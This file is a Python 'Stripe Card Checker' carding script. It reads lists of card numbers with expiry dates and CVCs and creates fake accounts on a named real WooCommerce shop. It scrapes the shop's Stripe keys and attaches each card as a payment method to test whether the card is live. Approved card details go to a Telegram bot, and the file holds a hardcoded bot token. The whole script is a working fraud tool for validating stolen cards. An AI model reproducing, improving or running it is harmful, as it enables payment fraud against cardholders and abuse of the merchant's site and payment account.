
import os
import sys
import re
import time
import random
import json
import uuid
import string
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from datetime import datetime
import brotli

# ------------------------------------------------------------
# Telegram configuration (filled later)
TELEGRAM_BOT_TOKEN = "8190896455:AAFXvW4eVTDvESHw_SHYxHCRXngxYnMJKqc"
TELEGRAM_CHAT_ID = ""
DEVELOPER = "TalkNeon"
CHANNEL = ""
WELCOME_VIDEO_URL = ""

# ------------------------------------------------------------
# Helper functions
# ------------------------------------------------------------
def send_telegram_message(message):
    """Send plain text message via Telegram."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "text": message,
            "parse_mode": "HTML"
        }
        resp = requests.post(url, json=data, timeout=10)
        return resp.status_code == 200
    except Exception:
        return False

def send_telegram_video(video_url, caption):
    """Send a video by URL to Telegram."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendVideo"
        data = {
            "chat_id": TELEGRAM_CHAT_ID,
            "video": video_url,
            "caption": caption,
            "parse_mode": "HTML"
        }
        resp = requests.post(url, json=data, timeout=15)
        return resp.status_code == 200
    except Exception:
        return False

def setup_session():
    """Create a requests session with retries and headers."""
    session = requests.Session()
    retry = Retry(total=3, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
    adapter = HTTPAdapter(max_retries=retry)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    ua = UserAgent()
    session.headers.update({
        'User-Agent': ua.random,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
    })
    return session

def generate_email():
    """Generate a random Gmail address."""
    return f"user{random.randint(1000,9999)}@gmail.com"

def generate_password():
    """Generate a random password."""
    return f"fifa24Iok#{random.randint(1000,9999)}"

def get_script_data(page_soup):
    """Extract Stripe publishable key, nonce, and account ID from page script."""
    script_tag = page_soup.find('script', string=re.compile(r'var wcpay_upe_config'))
    if not script_tag:
        script_tag = page_soup.find('script', string=re.compile(r'wcpay'))
    if not script_tag:
        scripts = page_soup.find_all('script')
        for script in scripts:
            if script.string and 'createSetupIntentNonce' in script.string:
                script_tag = script
                break
    if not script_tag or not script_tag.string:
        return None, None, None
    content = script_tag.string
    nonce_match = re.search(r'"createSetupIntentNonce":"([^"]+)"', content)
    key_match = re.search(r'"publishableKey":"([^"]+)"', content)
    acc_id_match = re.search(r'"accountId":"([^"]+)"', content)
    nonce = nonce_match.group(1) if nonce_match else None
    key = key_match.group(1) if key_match else None
    acc_id = acc_id_match.group(1) if acc_id_match else ""
    return nonce, key, acc_id

def check_card(card_data, session, ua):
    """
    Process one card.
    Returns a tuple (status, message).
    """
    n, mm, yy, cvc = card_data
    try:
        # Step 1: Register a new account
        mail = generate_email()
        password = generate_password()

        reg_page = session.get('https://meddentalstuff.com/my-account/', timeout=15)
        reg_page.raise_for_status()
        soup = BeautifulSoup(reg_page.text, 'html.parser')
        register_nonce_tag = soup.find('input', {'name': 'woocommerce-register-nonce'})
        if not register_nonce_tag:
            return "FAIL", "Could not find registration nonce"
        register_nonce = register_nonce_tag['value']

        reg_data = {
            'email': mail,
            'password': password,
            'woocommerce-register-nonce': register_nonce,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
            'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        }

        reg_response = session.post('https://meddentalstuff.com/my-account/', data=reg_data, timeout=15)
        reg_response.raise_for_status()
        # Check registration success
        if reg_response.url == 'https://meddentalstuff.com/my-account/':
            soup_err = BeautifulSoup(reg_response.text, 'html.parser')
            err_msg = soup_err.find('ul', class_='woocommerce-error')
            if err_msg:
                return "FAIL", f"Registration failed: {err_msg.get_text(strip=True)}"

        # Step 2: Go to add payment method page
        payment_page = session.get('https://meddentalstuff.com/my-account/add-payment-method/', timeout=15)
        payment_page.raise_for_status()
        payment_soup = BeautifulSoup(payment_page.text, 'html.parser')

        # Extract Stripe configuration
        nonce, key, acc_id = get_script_data(payment_soup)
        if not nonce or not key:
            return "FAIL", "Could not extract Stripe configuration"

        # Step 3: Create payment method via Stripe API
        stripe_headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'user-agent': ua.random,
        }
        sessionid = str(uuid.uuid4())
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())

        stripe_data = (
            f"billing_details[name]=+&billing_details[email]={mail}"
            f"&billing_details[address][country]=US&billing_details[address][postal_code]=91711"
            f"&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}"
            f"&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F2dcfccda05%3B+stripe-js-v3%2F2dcfccda05%3B+payment-element%3B+deferred-intent"
            f"&referrer=https%3A%2F%2Fmeddentalstuff.com&time_on_page=44602"
            f"&client_attribution_metadata[client_session_id]={sessionid}"
            f"&client_attribution_metadata[merchant_integration_source]=elements"
            f"&client_attribution_metadata[merchant_integration_subtype]=payment-element"
            f"&client_attribution_metadata[merchant_integration_version]=2021"
            f"&client_attribution_metadata[payment_intent_creation_flow]=deferred"
            f"&client_attribution_metadata[payment_method_selection_flow]=merchant_specified"
            f"&client_attribution_metadata[elements_session_config_id]=8f2dd842-031b-4412-bcc5-bb7b38fb7f1b"
            f"&guid={guid}&muid={muid}&sid={sid}&key={key}&_stripe_account={acc_id}"
        )

        stripe_resp = session.post('https://api.stripe.com/v1/payment_methods',
                                   headers=stripe_headers,
                                   data=stripe_data,
                                   timeout=15)
        stripe_resp.raise_for_status()
        stripe_json = stripe_resp.json()
        pm_id = stripe_json.get('id')
        if not pm_id:
            error_msg = stripe_json.get('error', {}).get('message', 'Unknown error')
            return "DECLINED", error_msg

        # Step 4: Add payment method to WooCommerce account
        from requests_toolbelt.multipart.encoder import MultipartEncoder
        multipart_data = MultipartEncoder({
            'action': 'create_setup_intent',
            'wcpay-payment-method': pm_id,
            '_ajax_nonce': nonce,
        })
        ajax_headers = {
            'authority': 'meddentalstuff.com',
            'accept': '*/*',
            'content-type': multipart_data.content_type,
            'origin': 'https://meddentalstuff.com',
            'referer': 'https://meddentalstuff.com/my-account/add-payment-method/',
            'user-agent': ua.random,
        }
        ajax_resp = session.post('https://meddentalstuff.com/wp-admin/admin-ajax.php',
                                 headers=ajax_headers,
                                 data=multipart_data,
                                 timeout=15)
        ajax_resp.raise_for_status()

        content_encoding = ajax_resp.headers.get('Content-Encoding', '')
        if content_encoding == 'br':
            content = brotli.decompress(ajax_resp.content).decode('utf-8')
        else:
            content = ajax_resp.text

        if '"success":true' in content or '"success":True' in content:
            return "APPROVED", None
        else:
            match = re.search(r'"message"\s*:\s*"([^"]+)"', content)
            msg = match.group(1) if match else "Unknown error"
            return "DECLINED", msg

    except requests.exceptions.RequestException as e:
        return "ERROR", f"Network error: {str(e)}"
    except Exception as e:
        return "ERROR", f"Unexpected error: {str(e)}"

# ------------------------------------------------------------
# Main
# ------------------------------------------------------------
def main():
    global TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID

    try:
        from colorama import init, Fore, Back, Style
        init(autoreset=True)
    except ImportError:
        class Fore:
            RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
        class Back:
            RED = GREEN = YELLOW = BLUE = MAGENTA = CYAN = WHITE = RESET = ''
        class Style:
            RESET_ALL = ''

    # Get combo file
    combo_file = input(f"{Back.RED} ENTER TXT FILE NAME : ").strip()
    try:
        with open(combo_file, 'r', encoding='utf-8') as f:
            lines = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}File not found!{Style.RESET_ALL}")
        return

    # Telegram settings (optional)
    token_input = input("Enter Telegram Bot Token (optional, press Enter to skip): ").strip()
    if token_input:
        TELEGRAM_BOT_TOKEN = token_input
        chat_id_input = input("Enter Telegram Chat ID: ").strip()
        if chat_id_input:
            TELEGRAM_CHAT_ID = chat_id_input

    # Send welcome video if Telegram is configured
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
        caption = (
            f"<b>🔥 Stripe Card Checker 🔥</b>\n\n"
            f"<b>Developer:</b> {DEVELOPER}\n"
            f"<b>Channel:</b> {CHANNEL}\n\n"
            f"<b>Script Features:</b>\n"
            f"✔️ Checks payment cards via Stripe & WooCommerce\n"
            f"✔️ Automatically registers accounts\n"
            f"✔️ Sends approved results here\n"
            f"✔️ Fast & reliable\n\n"
            f"<i>Good luck! 🚀</i>"
        )
        send_telegram_video(WELCOME_VIDEO_URL, caption)

    session = setup_session()
    ua = UserAgent()

    total = len(lines)
    approved = []
    for idx, line in enumerate(lines, 1):
        parts = line.split('|')
        if len(parts) < 4:
            print(f"{Fore.YELLOW}Card {idx}: Invalid format - {line}{Style.RESET_ALL}")
            continue

        n = parts[0].strip()
        mm = parts[1].strip()
        yy = parts[2].strip()
        cvc = parts[3].strip()

        # Normalize month and year
        if mm in ['10', '11', '12']:
            pass
        elif len(mm) == 1:
            mm = f'0{mm}'

        if not yy.startswith('20') and len(yy) == 2:
            yy = f'20{yy}'

        print(f"{Fore.WHITE}{Back.RED}\n CHECKING CARD {idx}: {n}|{mm}|{yy}|{cvc}{Style.RESET_ALL}")

        status, msg = check_card((n, mm, yy, cvc), session, ua)

        if status == "APPROVED":
            print(f"{Fore.GREEN}CARD {idx}: {n}|{mm}|{yy}|{cvc} - APPROVED ✅{Style.RESET_ALL}")
            approved.append((n, mm, yy, cvc))
            if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID:
                msg_text = (
                    f"✅ <b>APPROVED CARD</b>\n"
                    f"<code>{n}|{mm}|{yy}|{cvc}</code>\n"
                    f"💳 <b>Bin:</b> {n[:6]}\n"
                    f"🕒 <b>Time:</b> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    f"👤 <b>Developer:</b> {DEVELOPER}\n"
                    f"📢 <b>Channel:</b> {CHANNEL}"
                )
                send_telegram_message(msg_text)
        elif status == "DECLINED":
            print(f"{Fore.RED}CARD {idx}: {n}|{mm}|{yy}|{cvc} - DECLINED ❌ ({msg}){Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}CARD {idx}: {n}|{mm}|{yy}|{cvc} - {status} ({msg}){Style.RESET_ALL}")

        # Optional delay to avoid rate limits
        time.sleep(random.uniform(0.5, 1.5))

    session.close()

    # Send final summary
    if TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID and approved:
        summary = (
            f"🏁 <b>Check Completed</b>\n"
            f"✅ <b>Approved:</b> {len(approved)}\n"
            f"🔢 <b>Total checked:</b> {total}\n"
            f"💻 <b>Developer:</b> {DEVELOPER}\n"
            f"📢 <b>Channel:</b> {CHANNEL}"
        )
        send_telegram_message(summary)

    print(f"{Fore.CYAN}\nCheck completed!{Style.RESET_ALL}")

if __name__ == "__main__":
    main()